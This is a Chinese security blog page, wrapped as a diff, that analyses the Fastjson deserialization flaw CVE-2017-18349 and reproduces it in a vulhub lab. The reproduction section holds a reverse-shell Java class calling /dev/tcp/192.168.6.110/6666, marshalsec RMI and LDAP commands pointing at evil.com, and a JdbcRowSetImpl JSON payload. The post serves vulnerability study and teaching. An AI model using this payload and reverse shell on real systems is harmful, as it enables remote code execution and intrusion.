@@ -1,0 +1,382 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Fastjson 远程命令执行漏洞(CVE-2017-18349) | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  <meta name="description" content="Fastjson 远程命令执行漏洞(CVE-2017-18349)漏洞概述fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。
+参考链接：
+序列化和反序列化对于Fastjson来讲，并不是所有的Java对象都能被转为JSON，只有Java Bean格式的对象才能Fastjson被转为JSON。
+Fastjson提供了两个主要接口来分别实现对于Java Object的序列化和反序列化操作：
+
+JSON.toJSONString
+JSON.parseObject/JSON.parse
+
+反序列化时不指定特定的类，那么Fastjson就默认将一个JSON字符串反序列化为一个JSONObject。需要注意的是，对于类中private类型的属性值，Fastjson默认不会将其序列化和反序列化。
+Fastjson中的@type"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Fastjson 远程命令执行漏洞(CVE-2017-18349)"/>
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="All the tools.">
+			  <i class="fa fa-terminal"></i>Tool
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Fastjson 远程命令执行漏洞(CVE-2017-18349)</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="Fastjson-远程命令执行漏洞-CVE-2017-18349"><a href="#Fastjson-远程命令执行漏洞-CVE-2017-18349" class="headerlink" title="Fastjson 远程命令执行漏洞(CVE-2017-18349)"></a>Fastjson 远程命令执行漏洞(CVE-2017-18349)</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p>
+<p>参考链接：</p>
+<h4 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h4><p>对于Fastjson来讲，并不是所有的Java对象都能被转为JSON，只有Java Bean格式的对象才能Fastjson被转为JSON。</p>
+<p>Fastjson提供了两个主要接口来分别实现对于Java Object的序列化和反序列化操作：</p>
+<ul>
+<li><code>JSON.toJSONString</code></li>
+<li><code>JSON.parseObject/JSON.parse</code></li>
+</ul>
+<p>反序列化时不指定特定的类，那么Fastjson就默认将一个JSON字符串反序列化为一个JSONObject。需要注意的是，对于类中<code>private</code>类型的属性值，Fastjson默认不会将其序列化和反序列化。</p>
+<h4 id="Fastjson中的-type"><a href="#Fastjson中的-type" class="headerlink" title="Fastjson中的@type"></a>Fastjson中的@type</h4><p>使用Fastjson序列化对象的时候，如果<code>toJSONString()</code>方法不添加额外的属性，那么就会将一个Java Bean转换成JSON字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;Faster&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果想把JSON字符串反序列化成Java Object，可以使用<code>parse()</code>方法。该方法默认将JSON字符串反序列化为一个JSONObject对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.JSONObject</span><br><span class="line">&#123;&quot;name&quot;:&quot;Faster&quot;,&quot;age&quot;:18&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="将JSON字符串反序列化为原始的类（两种）"><a href="#将JSON字符串反序列化为原始的类（两种）" class="headerlink" title="将JSON字符串反序列化为原始的类（两种）"></a>将JSON字符串反序列化为原始的类（两种）</h4><ol>
+<li>序列化的时候，在<code>toJSONString()</code>方法中添加额外的属性<code>SerializerFeature.WriteClassName</code>，将对象类型一并序列化：</li>
+</ol>
+<p>	</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Faster&quot;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化时添加额外属性</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jsonType</span> <span class="operator">=</span> JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(type);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出，Fastjson在JSON字符串中添加了一个<span class="meta">@type</span>字段，用于标识对象所属的类</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;fastjson.Person&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Faster&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在反序列化该JSON字符串的时候，<code>parse()</code>方法就会根据<code>@type</code>标识将其转为原来的类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonText</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Faster\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(JSON.parse(jsonText));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//结果如下</span></span><br><span class="line">Person@4459eb14</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>反序列化的时候，在<code>parseObject()</code>方法中手动指定对象的类型</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bject</span> <span class="variable">o3</span> <span class="operator">=</span> JSON.parseObject(jsonText,Person.class);</span><br><span class="line">System.out.println(o3.getClass().getName());</span><br><span class="line">System.out.println(o3);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">fastjson.Person</span><br><span class="line">fastjson.Person@1e6d1014</span><br></pre></td></tr></table></figure>
+
+<h4 id="Fastjson分析"><a href="#Fastjson分析" class="headerlink" title="Fastjson分析"></a>Fastjson分析</h4><p>序列化：<code>toJSONString()</code>方法实际是通过调用getter来获取对象的属性值的，根据这些属性值来生成JSON字符串。</p>
+<p>反序列化：<code>parse()</code>先调用@type标识的类的构造函数，然后再调用setter给对象赋值；parseObject()方法会同时调用setter和getter。</p>
+<p><strong>源码分析</strong></p>
+<p><code>DefaultJSONParser#parseObject</code>方法中，通过<code>scanSymbol()</code>方法来解析出表示符 @type</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240201172029725.png" alt="image-20240201172029725"></p>
+<p>反射加载<code>@type</code></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240201195551574.png" alt="image-20240201195551574"></p>
+<p>反射加载的类的时候会对类进行黑名单检查，黑名单中有Thread类</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240201200115379.png" alt="image-20240201200115379"></p>
+<p>然后会在反射获取的方法中循环遍历寻找特定的setter和getter。条件如下：</p>
+<ul>
+<li>方法名长度大于4且以set开头，且第四个字母要是大写</li>
+<li>非静态方法</li>
+<li>返回类型为void或当前类</li>
+<li>参数个数为1个</li>
+</ul>
+<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>fastjson依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在反序列化时，parse触发了set方法，parseObject同时触发了set和get方法，由于存在这种<code>autoType</code>特性。如果<code>@type</code>标识的类中的setter或getter方法存在恶意代码，那么就有可能存在fastjson反序列化漏洞。</p>
+<h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><p>Calc.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String calc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCalc</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getter&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> calc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCalc</span><span class="params">(String calc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.calc = calc;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>fastjsonTestCalc.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonTestCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonCalc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Calc\&quot;,\&quot;calc\&quot;:\&quot;Faster\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(JSON.parseObject(jsonCalc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240201202542836.png" alt="image-20240201202542836"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>CVE-2017-18349</p>
+<p>环境：vulhub</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240324201602077.png" alt="image-20240324201602077"></p>
+<p>目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令</p>
+<p>ReverseShell.java编译成class并开启http服务(python -m http.server 80)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReverseShell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.6.110/6666 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240325133120899.png" alt="image-20240325133120899"></p>
+<p>借助<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a>项目(测试Jdk8u211)，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>ReverseShell.class</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://evil.com/#ReverseShell&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240325133052275.png" alt="image-20240325133052275"></p>
+<p>向靶场服务器发送Payload，带上RMI的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://evil.com:9999/ReverseShell&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240325133148708.png" alt="image-20240325133148708"></p>
+<p>Final</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240325133308910.png" alt="image-20240325133308910"></p>
+<p><strong>LDAP</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://evil.com/#ReverseShell&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240325135737374.png" alt="image-20240325135737374"></p>
+
+	  <!--
+<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+-->
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/05/10/writeup/htb/HTB Headless/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/04/02/vuln/2021 Log4j2 lookup JNDI注入/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-04-12 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Vuln/">Vuln<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Fastjson-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-18349"><span class="toc-article-text">Fastjson 远程命令执行漏洞(CVE-2017-18349)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-article-text">漏洞概述</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-article-text">序列化和反序列化</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Fastjson%E4%B8%AD%E7%9A%84-type"><span class="toc-article-text">Fastjson中的@type</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%B0%86JSON%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%BA%E5%8E%9F%E5%A7%8B%E7%9A%84%E7%B1%BB%EF%BC%88%E4%B8%A4%E7%A7%8D%EF%BC%89"><span class="toc-article-text">将JSON字符串反序列化为原始的类（两种）</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Fastjson%E5%88%86%E6%9E%90"><span class="toc-article-text">Fastjson分析</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">反序列化漏洞</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#demo"><span class="toc-article-text">demo</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-article-text">漏洞复现</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
